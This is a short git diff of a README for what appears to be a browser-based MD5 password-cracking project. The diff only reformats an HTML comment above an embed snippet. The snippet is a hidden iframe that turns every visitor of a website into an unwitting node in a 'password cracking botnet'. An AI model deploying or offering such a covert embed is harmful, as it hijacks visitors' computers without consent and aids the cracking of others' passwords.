@@ -5,10 +5,8 @@ Borrow CPU cycles from visitor's web browsers to crack MD5 password hashes. Embe
 ![Screenshot](.screenshot.png)
 
 ```html
-<!--
-	add a single iframe embed to *your* website to add all visitors
-    as nodes in the password cracking botnet
- -->
+<!-- add a single iframe embed to *your* website to add all visitors
+     as nodes in the password cracking botnet -->
 <iframe src="YOUR_WEBSITE.com:3000/embed" style="display:none">
 ```
 
